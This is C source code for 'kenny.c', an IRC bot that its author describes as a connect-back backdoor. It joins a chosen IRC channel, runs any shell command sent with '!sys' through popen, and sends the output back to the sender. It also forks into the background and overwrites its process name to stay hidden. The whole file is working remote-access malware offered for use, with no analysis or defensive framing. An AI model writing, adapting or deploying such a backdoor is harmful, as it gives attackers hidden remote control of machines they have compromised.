/*
** kenny.c by konewka <konewka@eviltime.com> 
**
** Simple IRC bot, that can execute shell commands and print it out
** to you. With this bot you may execute shell commands with full anonymity,
** it's kind of connect back backdoor.
**
** It has been tested on IRCnet and EFnet IRC networks, and should
** compile without any problems on Linux and FreeBSD.
**
** If you want only one certain host to execute commands compile with
** -DMASTERONLY flag and change MASTER define.
**
** Fell free to add your functions, but keep my nickname in credits.
*/
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <stdarg.h>

#define MASTER		"konewka@pr90.poznan.sdi.tpnet.pl"
#define HIDE		"kenny"
#define MAX_NICK	9
#define MAX_SERVER	512

struct info {
    char	server[256];
    int		port;
    char	nick[MAX_NICK];
    char	chan[200];
    char 	key[64];
};

int setupsock(char *host, int port);
int parse_server(char *buf);
void parse_channel(char *buf);
void send_req(FILE *ircfd, struct info bot);
void main_loop(FILE *ircfd, struct info bot);
char *random_nick(void);
void exec(FILE *ircfd, char *command, char *nick);
char *remove_cr_nl(char *str);
void sendirc(FILE *ircfd, char *format, ...);

char *remove_cr_nl(char *str) {
    int i;
    
    for (i=0;i<strlen(str);i++)
	if (str[i] == '\r' || str[i] == '\n')
	    str[i] = '\0';
    
    return str;
}

void sendirc(FILE *ircfd, char *format, ...) {
    char buf[MAX_SERVER] = "";
    va_list args;
    
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);    
    fprintf(ircfd, buf);
    va_end(args);
}

void exec(FILE *ircfd, char *command, char *nick) {
    char buf[1024] = "";
    FILE *sys;
    
    snprintf(buf, sizeof(buf), "export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/bin;%s", command);
    sys = popen(buf, "r");
    while (fgets(buf, sizeof(buf), sys)) {
	sendirc(ircfd, "NOTICE %s :%s\n", nick, buf);
	memset(buf, 0, sizeof(buf));
	sleep(1);
    }
    pclose(sys);
}

void main_loop(FILE *ircfd, struct info bot) {
    char	buf[MAX_SERVER],
		nick[MAX_NICK],
		host[256],
		cmd[MAX_NICK],
		arg1[356],
		useless[32],
		what[128];
    int 	i, j, buflen;
    	
    while (fgets(buf, MAX_SERVER, ircfd)) {
	memset(nick, 0, MAX_NICK);
	memset(host, 0, sizeof(host));
	memset(useless, 0, sizeof(useless));
	memset(what, 0, sizeof(what));
	memset(cmd, 0, sizeof(cmd));
	memset(arg1, 0, sizeof(arg1));
	buflen = strlen(buf);
	
	for (i=0;i<buflen && buf[i] != ' ';i++)
	    if (buf[i] == '!')
		goto user;
	
	for (i=j=0;i<buflen && buf[i] != ' ' && j<sizeof(useless);i++)
	    useless[j++] = buf[i];
	
	if (!strcmp(useless, "PING")) {
	    for (i++,j=0;i<buflen && buf[i] != '\r' && buf[i] != ' ' && j<sizeof(what);i++) {
		if (buf[i] == ':')
		    continue;
		what[j++] = buf[i];
	    }
	}
	else
	    continue;
	
	sendirc(ircfd, "PING %s\n", remove_cr_nl(what));
	
	continue;
	
	user:
	for (i=j=0;i<buflen && buf[i] != '!' && j<MAX_NICK;i++) {
	    if (buf[i] == ':')
		continue;
	    nick[j++] = buf[i];
	}
	for (j=0;i<buflen && buf[i] != ' ' && j<sizeof(host);i++) {
	    if (buf[i] == '!')
		continue;
	    host[j++] = buf[i];
	}
	for (j=0,i++;i<buflen && buf[i] != ' ' && j<sizeof(useless);i++)
	    useless[j++] = buf[i];
	    
	if (strcmp(useless, "PRIVMSG"))
	    continue;
	
	for (;i<buflen;i++) {
	    if (buf[i] == ':') {
		for (j=0,i++;i<buflen && j<sizeof(cmd) && buf[i] != ' ';i++)
		    cmd[j++] = buf[i];
		break;
	    }
	}
	for (j=0,i++;i<buflen && j<sizeof(arg1) && buf[i] != '\r';i++,j++)
	    arg1[j] = buf[i];
	
	#ifdef MASTERONLY
	if (strcmp(host, MASTER))
	    continue;
	#endif
	if (strstr(cmd, "!sys")) {
	    if (!strlen(arg1))
		sendirc(ircfd, "NOTICE %s :are you joking me ?\n", nick);
	    else
		exec(ircfd, arg1, nick);
	}
	else if (strstr(cmd, "!exit")) {
	    sendirc(ircfd, "QUIT :phearrr\n");
	    break;
	}
    } // while 
}

int parse_server(char *buf) {
    char *parse, tmp[8] = "";
    int i, k = 0;
    
    /* avoid from access voliation */
    if ((parse = strchr(buf, ' '))) {
        if (!strchr(parse+1, ' '))
            return 0;
    }
    else
        return 0;

    /* numeric replies */
    for (i=0;buf[i] != ' ';i++) ;
    do {
        tmp[k++] = buf[i++];
    } while (buf[i] != ' ');
    
    return atoi(tmp);
}

char *random_nick(void) {
    struct timeval tv;
    char ascii[] = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPrRsStTuUwWxXyYzZqQ1234567890";
    char *ptr, tmp[MAX_NICK];
    int i;
    
    gettimeofday(&tv, (struct timezone *)NULL);
    srandom(tv.tv_usec);
    for (i=0;i<MAX_NICK-1;i++)
	tmp[i] = ascii[random()%strlen(ascii)];
    tmp[i] = '\0';
    
    ptr = tmp;
    return ptr;
}

void send_req(FILE *ircfd, struct info bot) {
    int server = 0;
    char *buf;
    
    buf = (char *)malloc(sizeof(char)*MAX_SERVER);
    if (!buf)
        exit(0);
    
    memcpy(bot.nick, random_nick(), sizeof(bot.nick));
    sendirc(ircfd, "USER %s * * ::unknown:\n", bot.nick);
    sendirc(ircfd, "NICK %s\n", bot.nick);
    
    while (fgets(buf, MAX_SERVER, ircfd)) {
	server = parse_server(buf);
	
        if (server == 433) {
	    memcpy(bot.nick, random_nick(), sizeof(bot.nick));
	    sendirc(ircfd, "NICK %s\n", bot.nick);
	}
	else if (server == 376)
            sendirc(ircfd, "JOIN #%s %s\n", bot.chan, bot.key);
        else if (server == 465) {
            printf("{-} You are banned from this server\n");
            exit(0);
        }
        else if (server == 432) {
	    memcpy(bot.nick, random_nick(), sizeof(bot.nick));
	    sendirc(ircfd, "NICK %s\n", bot.nick);
	}
	else if (server == 366)
	    break;
    }
    
    free(buf);
}

int setupsock(char *host, int port) {
    struct sockaddr_in remote;
    struct hostent *hp;
    int sock;
        
    if (!(hp = gethostbyname(host))) {
	printf("{-} host not found\n");
	return -1;
    }
    
    memset((char *)&remote, 0, sizeof(remote));
    remote.sin_family = AF_INET;
    remote.sin_port = htons(port);
    memcpy((char *)&remote.sin_addr, hp->h_addr, hp->h_length);
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
	printf("{-} cannot create socket\n");
	return -1;
    }
    if (connect(sock, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
	printf("{-} connection refused (%d)\n", port);
	return -1;
    }
    
    return sock;
}
    
int main(int argc, char *argv[]) {
    struct info bot;
    int i = 0, sd;
    FILE *ircfd;
    
    if (argc < 3) {
	printf("{+} usage: %s <server:port> <chan> [ch_key]\n", argv[0]);
	return 0;
    }
    
    if (!strchr(argv[1], ':')) {
	printf("{-} Wrong server syntax.\n");
	return -1;
    }
    
    memcpy(bot.server, strtok(argv[1], ":"), sizeof(bot.server));
    for (i=0;i<strlen(argv[1]);i++)
	if (argv[1][i] == ':')
	    break;
    if (argv[1][i+1] == '\0') {
	printf("{-} go away kid\n");
	return -1;
    }
    bot.port = atoi(strtok(NULL, "\0"));
    if (argv[2][0] == '#') {
	printf("{-} Wrong channel name.\n");
	return -1;
    }
    memcpy(bot.chan, argv[2], sizeof(bot.chan));
    if (argv[3])
	memcpy(bot.key, argv[3], sizeof(bot.key));
    else
	memcpy(bot.key, "key", strlen("key"));
    
    if ((sd = setupsock(bot.server, bot.port)) < 0)
	return -1;
    
    ircfd = fdopen(sd, "r+");
    setbuf(ircfd, NULL);
    
    send_req(ircfd, bot);
    printf("{+} Connected\n");
    
    if (fork())
	exit(0);
    
    for (i=0;i<argc;i++)
	memset(argv[i], 0, strlen(argv[i]));
    memcpy(argv[0], HIDE, strlen(HIDE));
    
    main_loop(ircfd, bot);
    
    close(sd);
    fclose(ircfd);
    
    return 0;
}
